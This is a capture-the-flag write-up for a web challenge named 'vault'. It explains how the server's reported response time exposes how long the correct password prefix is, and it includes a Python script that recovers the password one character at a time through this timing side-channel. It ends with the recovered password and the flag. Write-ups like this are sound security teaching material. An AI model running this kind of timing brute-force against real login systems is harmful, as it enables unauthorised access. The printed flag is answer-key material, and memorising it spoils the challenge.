# vault

```
We've employed state-of-the-art brute-force prevention, hopefully there won't be any side-effects.

Note: reasonable brute-forcing is allowed for this challenge. You shouldn't need to make more than 1000 requests in total, and please don't send more than 25 requests per second.
vault.secso.cc 
```

Visit the website and try a random password. Response contains:

```
Incorrect password. Try again.

Response time: 0.00 ms
```

So it is possible that the response time is related to the length of the matching prefix. After some tests, every correct character in prefix contributes to 100ms in the time.

Attack script:

```python
import requests
import string
import urllib.parse

password = ""
last = 0

for index in range(40):
    done = False
    for i in string.printable:
        url = "https://vault.secso.cc/?" + urllib.parse.urlencode(
            {"password": password + i}
        )
        r = requests.get(url)
        for line in r.text.splitlines():
            if "Response time" in line:
                time = float(line.strip().split()[2])
                print(password + i, time)
                if time > last + 100:
                    last += 100
                    password += i
                    done = True
                    break
        if done:
            break
```

Correct password: `H8iObjIcSr`.

Flag: `K17{aLL_iN_go0d_t1m3}`.
